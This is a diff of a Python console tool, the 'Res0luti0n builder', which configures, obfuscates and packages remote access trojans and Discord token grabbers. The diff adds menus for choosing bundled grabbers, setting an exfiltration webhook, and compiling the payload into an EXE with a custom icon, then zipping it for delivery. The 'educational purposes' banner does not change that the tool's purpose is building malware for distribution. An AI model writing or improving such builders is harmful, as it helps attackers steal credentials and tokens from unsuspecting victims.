@@ -1,4 +1,4 @@
-#<---       KS BUILDER by 0xSp00f3d         --->
+#<---       Res0luti0n builder by 0xSp00f3d         --->
 #<---             python 3.x                --->
 #<--- Only for educationnal / good purposes --->
 
@@ -11,6 +11,23 @@ import shutil
 import time
 import string
 import json
+from pypresence import Presence
+
+
+def rich_presence():
+    try:
+        rpc = Presence("691934102307340298")
+        rpc.connect()
+        rpc.update(
+            large_image= "resolution_logo",
+            large_text = f"Res0luti0n",
+            details = "Version 2.0",
+            state = "by 0xSp00f3d",
+            buttons=[{"label": "Github", "url": "https://github.com/0xSpoofed/Res0luti0n"}]
+        )
+    except Exception as e:
+        pass
+
 
 def readfile(path):
     with open(path, 'r', encoding='UTF-8') as f:
@@ -48,7 +65,7 @@ def write_json(file_path: str, data: dict) -> None:
 def get_settings():
     with open(f"{os.getcwd()}\\utilities\\config.json", 'r') as json_file:
         json_data = json.load(json_file)
-    return json_data["name"], json_data["path"], json_data["webhook"]
+    return json_data["name"], json_data["path"], json_data["requirements"], json_data["webhook"], json_data["exe_yn"], json_data["exe_comp"], json_data["icon"]
 
 
 def webhook_checker(webhook_link):
@@ -112,8 +129,142 @@ def obfuscate(content):
     return code
 
 
+def choice_rat(banner, w, m):
+    while True:
+        os.system("cls")
+        print(f"{banner}\n -----\n")
+        print(f" {m}[{w}+{m}]{w} RAT Choice:\n")
+        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}3{m}]{w} Select your own RAT")
+        print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber (by Astraadev)    | {m}[{w}4{m}]{w} Back to home")
+        choice_rat = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+        
+        if choice_rat == "1":
+            os.system("cls")
+            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "Cooked-grabber.py" ))
+            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "requirements.txt" ))
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: Cooked Grabber !")
+            time.sleep(3)
+        
+        elif choice_rat == "2":
+            os.system("cls")
+            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "Token-grabber.py" ))
+            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "requirements.txt" ))
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: Token grabber by Astraadev !")
+            time.sleep(3)
+        
+        elif choice_rat == "3":
+            os.system("cls")
+            input(f"{banner}\n\n {m}[{w}!{m}]{w} Warning: If you select your own RAT you must enter your webhook manually !\n ----\n {m}[{w}+{m}]{w} Press enter to continue...")
+            os.system("cls")
+            path = input(f"{banner}\n\n {w}[{m}+{w}] Enter your RAT path here: ")
+            req = input(f" -----\n {w}[{m}+{w}] Enter your RAT requirements here: ")
+            update_json("path", path)
+            update_json("requirements", req )
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: {os.path.basename(path)} !")
+            time.sleep(3)
+        
+        elif choice_rat == "4":
+            settings_menu(banner, w, m)
+
+def exe_settings(banner, w, m):
+    while True:
+        exe_yn, exe_comp = get_settings()[4:6]
+        os.system("cls")
+        print(f"{banner}\n -----\n")
+        print(f" {m}[{w}+{m}]{w} EXE Choice:\n")
+        print(f" {m}[{w}1{m}]{w} On/Off               | {m}[{w}3{m}]{w} Change exe logo")
+        print(f" {m}[{w}2{m}]{w} Change compiler      | {m}[{w}4{m}]{w} Back to home")
+
+        choice_exe = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+
+        if choice_exe == "1":
+            os.system("cls")
+            res = input(f"{banner}\n\n {m}[{w}+{m}]{w} {'Dea' if exe_yn == 'y' else 'A'}ctivate EXE compilation ? (y/n): ")
+            if res == "y":
+                update_json("exe_yn", "n" if exe_yn == 'y' else 'y')
+                os.system("cls")
+                print(f"{banner}\n\n {m}[{w}+{m}]{w} Your RAT will {'no longer be' if exe_yn == 'y' else 'be'} converted to exe!")
+                time.sleep(3)
+
+        elif choice_exe == "2":
+            os.system("cls")
+            print(f"{banner}\n -----\n")
+            print(f" {m}[{w}+{m}]{w} Compiler choice:\n")
+            print(f" {m}[{w}1{m}]{w} Cx Freeze {'(current)' if exe_comp == 'Cx_freeze' else ''}")
+            print(f" {m}[{w}2{m}]{w} Pyinstaller {'(current)' if exe_comp == 'Pyinstaller' else ''}")
+            print(f" -----\n {m}[{w}3{m}]{w} Back to home")
+
+            choice_compiler = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+
+            if choice_compiler in ["1", "2"]:
+                compiler = "Cx_freeze" if choice_compiler == "1" else "Pyinstaller"
+                update_json("exe_comp", compiler)
+                os.system("cls")
+                print(f"{banner}\n\n {m}[{w}+{m}]{w} The {compiler} compiler has been successfully selected!")
+                time.sleep(3)
+
+        elif choice_exe == "3":
+                os.system("cls")
+                logo_path = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your exe logo here (.ico): ")
+                if logo_path[-3:] != "ico":
+                    os.system("cls")
+                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Please enter a correct icon (.ico)! ")
+                    time.sleep(3)
+                else:
+                    update_json("icon", logo_path)
+                    os.system("cls")
+                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Your logo has been successfully selected !")
+                    time.sleep(3)
+        
+        elif choice_exe == "4":
+            settings_menu(banner, w, m)
+
+    
+def settings_menu(banner, w, m):
+    while True:
+        os.system("cls")
+        print(f"{banner}\n -----\n")
+        print(f" {m}[{w}+{m}]{w} RAT Setup:\n")
+        print(f" {m}[{w}1{m}]{w} Select your RAT    | {m}[{w}4{m}]{w} EXE settings")
+        print(f" {m}[{w}2{m}]{w} Change RAT name    | {m}[{w}5{m}]{w} Back to home")
+        print(f" {m}[{w}3{m}]{w} Change RAT webhook")
+        choice_settings = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+        
+        if choice_settings == "1": 
+            choice_rat(banner, w, m)
+            
+        elif choice_settings == "2": 
+            os.system("cls")
+            name = input(f"{banner}\n\n {w}[{m}+{w}] Enter rat name here: ")
+            update_json("name", name)
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} RAT name updated succesfully as ({name}) !")
+            time.sleep(3)
+            
+        elif choice_settings == "3": 
+            os.system("cls")
+            webhook = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your webhook here: ")
+            update_json("webhook", webhook)
+            os.system("cls")
+            if webhook_checker(webhook) == "Invalid":
+                print(f"{banner}\n\n {m}[{w}!{m}]{w} The webhook you entered seems to be wrong..")
+                time.sleep(3)
+            else: print(f"{banner}\n\n {m}[{w}+{m}]{w} RAT webhook updated succesfully !"), time.sleep(3)
+            
+        elif choice_settings == "4":
+            exe_settings(banner, w, m)
+            
+        elif choice_settings == "5": 
+            os.system("cls")
+            main()
+            
+            
 def builder(banner, m, w):
-    name, path_, webhook = get_settings()
+    name, path_, requirements, webhook, exe_yn, exe_comp, icon = get_settings()
+    
     if not os.path.exists(path_):
         os.system("cls")
         print(f"{banner}\n\n {w}[{m}!{w}] The path seems to be incorrect...")
@@ -121,7 +272,7 @@ def builder(banner, m, w):
         main()
     elif webhook_checker(webhook) != "Valid":
         os.system("cls")
-        agree = input(f"{banner}\n\n {w}[{m}!{w}] The webhook you entered seems to be wrong. Do you want to continue without using webhook (y/n) ?\n ---\n {w}[{m}>{w}] ")
+        agree = input(f"{banner}\n\n {m}[{w}!{m}]{w} The webhook you entered seems to be wrong. Do you want to continue without using webhook (y/n) ?\n ---\n {m}[{w}->{m}]{w} ")
         if agree == 'y':
             pass
         elif agree == 'n':
@@ -144,68 +295,45 @@ def builder(banner, m, w):
 
         if os.path.exists(name):
             shutil.rmtree(name, ignore_errors=True)
-        os.makedirs(name)
-        os.makedirs(f'{name}\\addons')
+            os.makedirs(name)
+        else: os.makedirs(name)
+        
         writefile(f'{name}\\{name}.py', obfuscate(injector_with_all))
-
-        for logo in os.listdir(os.path.join(os.getcwd(), 'utilities', 'addons')):
-            shutil.copy(os.path.join(os.getcwd(), 'utilities', 'addons', logo), os.path.join(os.getcwd(), name, 'addons', logo))
-
+        shutil.copy(requirements, os.path.join(os.getcwd(), name, "requirements.txt"))
+        
+        if exe_yn == "y":
+            script_name = os.path.join(os.getcwd(), name, f"{name}.py")
+            target_dir = f"{name}-exe"
+            icon_option = f"--icon {icon}" if icon != "None" else ""
+            
+            if exe_comp == "Cx_freeze":
+                cmd = f"cxfreeze -c {script_name} --target-dir {name}-exe {icon_option} --packages=win32api "
+            elif exe_comp == "Pyinstaller":
+                cmd = f"pyinstaller --noconfirm --onefile --console {icon_option} --distpath {target_dir} --hidden-import win32api --hidden-import win32con {script_name}"
+            os.system("cls")
+            os.system(cmd)
+            
+            if exe_comp == "Pyinstaller":
+                shutil.rmtree("build", ignore_errors=True)
+                try: os.remove(name + '.spec')
+                except: pass
+            
+            shutil.copy(requirements, os.path.join(os.getcwd(), f"{name}-exe", "requirements.txt"))
+            shutil.make_archive(f"{name}-exe", 'zip', name + "-exe")
+            shutil.rmtree(f"{name}-exe", ignore_errors=True)
+            
         shutil.make_archive(name, 'zip', name)
         shutil.rmtree(name, ignore_errors=True)
+            
         os.system("cls")
         input(f"{banner}\n\n {w}[{m}+{w}] Your {name} RAT has been successfully built in ({name}.zip)!")
         main()
+    
     except Exception as e:
+        input(e)
         os.system("cls")
-        print(e)
         input(f"{banner}\n\n {w}[{m}!{w}] An error occurred while building the rat!")
         
-        
-def settings_menu(banner, w, m):
-    while True:
-        os.system("cls")
-        print(f"{banner}\n -----\n")
-        print(f" {m}[{w}+{m}]{w} RAT Setup:\n")
-        print(f" {m}[{w}1{m}]{w} Change RAT name")
-        print(f" {m}[{w}2{m}]{w} Change RAT path")
-        print(f" {m}[{w}3{m}]{w} Change RAT webhook (optional)")
-        print(f" {m}[{w}4{m}]{w} Back to home")
-        choice_settings = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
-        
-        if choice_settings == "1": 
-            os.system("cls")
-            name = input(f"{banner}\n\n {w}[{m}+{w}] Enter rat name here: ")
-            update_json("name", name)
-            os.system("cls")
-            print(f"{banner}\n\n {w}[{m}+{w}] RAT name updated succesfully as ({name}) !")
-            time.sleep(3)
-            
-        elif choice_settings == "2": 
-            os.system("cls") 
-            rat_path = input(f"{banner}\n\n {w}[{m}+{w}] Enter your rat path here: ")
-            update_json("path", rat_path)
-            os.system("cls")
-            print(f"{banner}\n\n {w}[{m}+{w}] RAT path updated succesfully as ({rat_path}) !")
-            time.sleep(3)
-            
-        elif choice_settings == "3": 
-            os.system("cls")
-            webhook = input(f"{banner}\n\n {w}[{m}+{w}] Enter your webhook here: ")
-            update_json("webhook", webhook)
-            os.system("cls")
-            if webhook_checker(webhook) == "Invalid":
-                print(f"{banner}\n\n {w}[{m}!{w}] The webhook you entered seems to be wrong..")
-                time.sleep(3)
-                settings_menu(banner, w, m)
-            else: print(f"{banner}\n\n {w}[{m}+{w}] RAT webhook updated succesfully !")
-            time.sleep(3)
-            
-        elif choice_settings == "4": 
-            os.system("cls")
-            main()
-        
-
 
 def main():
     m = colorama.Fore.LIGHTMAGENTA_EX
@@ -217,13 +345,12 @@ def main():
  ██║  ██║███████╗███████║╚██████╔╝███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
  ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
  {w}by 0xSp00f3d | Only for educational or good puposes""".replace('█', f'{w}█{m}')
-
-    os.system('title Resolution Builder')
-    os.system("cls")
     
-    settings = get_settings()
-    rat_name, rat_path, webhook = settings[0], settings[1], settings[2]
-
+    rat_name, rat_path, requirements, webhook, exe_yn, exe_comp, logo = get_settings()
+    exe_yn_ehn = "Yes" if exe_yn == "y" else "No" if exe_yn == "n" else "Error"
+    exe_comp_ehn = exe_comp if exe_yn == "y" else "None" if exe_yn == "n" else "Error"
+    req_check = "Valid" if os.path.exists(requirements) else "Invalid"
+    
     webhook_info = webhook_checker(webhook)
     choices = {
         "1": lambda: builder(banner, m, w),
@@ -236,9 +363,9 @@ def main():
         print(f"""{banner}\n -----\n
  {m}[{w}+{m}]{w} Menu:              |    {m}[{w}INFO{m}]{w} Current Settings:            
                         |
- {m}[{w}1{m}]{w} Build              |    {m}[{w}>{m}]{w} RAT name: {rat_name} 
- {m}[{w}2{m}]{w} Setup              |    {m}[{w}>{m}]{w} RAT path: {os.path.basename(rat_path)} 
- {m}[{w}3{m}]{w} Exit               |    {m}[{w}>{m}]{w} Webhook: {webhook_info}""")
+ {m}[{w}1{m}]{w} Build              |    {m}[{w}>{m}]{w} RAT name: {"Unselected" if rat_name == '' else rat_name} {m}[{w}>{m}]{w} Webhook: {webhook_info}
+ {m}[{w}2{m}]{w} Setup              |    {m}[{w}>{m}]{w} RAT path: {"Invalid" if rat_path == '' else os.path.basename(rat_path)} {m}[{w}>{m}]{w} ExE compiler: {exe_yn_ehn} | {exe_comp_ehn}
+ {m}[{w}3{m}]{w} Exit               |    {m}[{w}>{m}]{w} Requirements path: {req_check} {m}[{w}>{m}]{w} Logo: {os.path.basename(logo) if logo != "None" else "None"} """) 
         
         choice = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
         if choice in choices:
@@ -252,4 +379,6 @@ def main():
     
     
 if __name__ == '__main__':
+    os.system('title Resolution builder')
+    rich_presence()
     main()
